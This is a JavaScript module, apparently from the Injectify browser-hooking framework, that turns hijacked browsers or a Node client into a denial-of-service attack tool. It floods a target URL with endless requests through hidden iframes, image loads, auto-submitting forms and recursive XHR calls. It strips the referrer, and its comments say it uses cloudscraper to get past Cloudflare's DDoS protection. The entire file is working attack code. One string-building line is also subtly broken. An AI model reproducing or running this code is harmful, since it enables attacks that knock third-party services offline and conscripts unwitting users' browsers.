var request = {
    method: 'GET',
    url: module.params,
    body: '',
    type: 'application/x-www-form-urlencoded',
    interval: 100,
    random: true,
};
/**
 * Functions
 */
var serialize = function (obj) {
    var str = [];
    for (var p in obj)
        if (obj.hasOwnProperty(p)) {
            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
        }
    return str.join("&");
};
/**
 * Parse the parameters
 */
if (typeof module.params == 'object') {
    var _a = module.params, method = _a.method, type = _a.type, url = _a.url, interval = _a.interval, random = _a.random, params = _a.params, body = _a.body;
    if (method)
        request.method = method.toUpperCase();
    if (type)
        request.type = type;
    if (url)
        request.url = url;
    if (interval)
        request.interval = interval;
    if (random)
        request.random = random;
    if (params || body) {
        if (!body)
            body = params;
        /**
         * Convert object parameters into query string
         */
        if (request.type === 'application/x-www-form-urlencoded') {
            if (typeof body === 'string') {
                /**
                 * Remove proceeding ?
                 */
                if (body.slice(0, 1) === '?')
                    body = body.slice(1);
            }
            else if (typeof body === 'object') {
                body = serialize(body);
            }
        }
        /**
         * Stringify JSON
         */
        if (request.type === 'application/json') {
            body = JSON.stringify(body);
        }
        request.body = body;
    }
}
if (injectify.info.platform === 'browser') {
    /**
     * Prevent referrer from being sent in the requests
     */
    var meta = document.createElement('meta');
    meta.name = 'referrer';
    meta.content = 'no-referrer';
    document.head.appendChild(meta);
    if (request.url) {
        if (request.method === 'GET') {
            /**
             * Parse the target url
             */
            var target_1 = request.url;
            if (request.body || request.random) {
                if (target_1.includes('?')) {
                    /**
                     * Target url already contains parameters
                     */
                    if (target_1.slice(-1) !== '&')
                        target_1 += '&';
                }
                else {
                    /**
                     * Target url doesn't contain parameters
                     */
                    target_1 += '?';
                }
                /**
                 * Parse the parameters
                 */
                if (request.body) {
                    target_1 += request.body;
                    if (request.random)
                        target_1 += '&';
                }
            }
            /**
             * DDoS from multiple documents
             */
            injectify.module('embed', {
                interaction: false,
                hidden: true
            }).then(function (element) {
                element.srcdoc = "<script>setInterval(function(){ let url=" + JSON.stringify(target_1) + request.random ? '+"?"++new Date()' : "; let req = new Image(); req.src=url; /* if (typeof window.fetch === \"function\") window.fetch(url); */ }," + request.interval * 4 + ")</script>";
            });
            /**
             * Request the target url
             */
            setInterval(function () {
                var url = target_1;
                /**
                 * Add a query string to prevent the server from sending a cached response
                 */
                if (request.random)
                    url += +new Date;
                /**
                 * Make a request
                 */
                // if (typeof window.fetch === 'function') {
                //     window.fetch(url)
                // }
                var req = new Image();
                req.src = url;
                req.onload;
            }, request.interval);
            module.return(true);
        }
        else {
            if (request.method === 'POST' && request.type === 'application/x-www-form-urlencoded') {
                /**
                 * POST request through a hidden form element
                 */
                var form_1 = document.createElement('form');
                var frameName_1 = +new Date();
                form_1.setAttribute('action', request.url);
                form_1.setAttribute('method', request.method);
                form_1.setAttribute('target', frameName_1.toString());
                /**
                 * Create the form elements
                 */
                var params = request.body.split('&');
                for (var i in params) {
                    /**
                     * Parse the parameters
                     */
                    var param = params[i].split('=');
                    var value = decodeURIComponent(param[1]);
                    /**
                     * Create input element
                     */
                    var input = document.createElement('input');
                    input.setAttribute('name', decodeURIComponent(param[0]));
                    input.setAttribute('value', value);
                    /**
                     * Append to the form
                     */
                    form_1.appendChild(input);
                }
                /**
                 * Make request
                 */
                injectify.module('embed', {
                    hidden: true
                }).then(function (embed) {
                    embed.setAttribute('srcdoc', "<body onload=\"document.getElementsByTagName('form')[0].submit()\">" + form_1.outerHTML + "<iframe name=\"" + frameName_1 + "\" onload=\"if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()}," + request.interval + ")}\"/></body>");
                });
            }
            else {
                /**
                 * Custom request
                 */
                (function ddosAttack() {
                    var XHR = new XMLHttpRequest();
                    XHR.open(request.method, request.url, true);
                    XHR.setRequestHeader("Content-type", request.type);
                    XHR.onreadystatechange = function () {
                        setTimeout(ddosAttack, request.interval);
                    };
                    XHR.send(request.body);
                })();
                module.return(true);
            }
        }
    }
    else {
        module.return(false);
    }
}
else {
    /**
     * NodeJS enabled client
     * Use cloudscraper to circumvent cloudflare DDoS prevention
     */
    var cloudscraper_1 = require('cloudscraper'); // leave the ;
    (function ddosAttack(thread) {
        var requestUrl = request.url;
        if (request.random)
            requestUrl += "?" + +new Date;
        cloudscraper_1.get(requestUrl, function (error, response, body) {
            /**
             * Move out of callstack
             */
            if (thread == 1) {
                setTimeout(function () {
                    ddosAttack(1);
                }, 0);
            }
        });
        if (thread == 1) {
            cloudscraper_1.get(requestUrl, function () {
                ddosAttack(2);
            });
            cloudscraper_1.get(requestUrl, function () {
                ddosAttack(3);
            });
            cloudscraper_1.get(requestUrl, function () {
                ddosAttack(4);
            });
            cloudscraper_1.get(requestUrl, function () {
                ddosAttack(5);
            });
        }
    })(1);
}
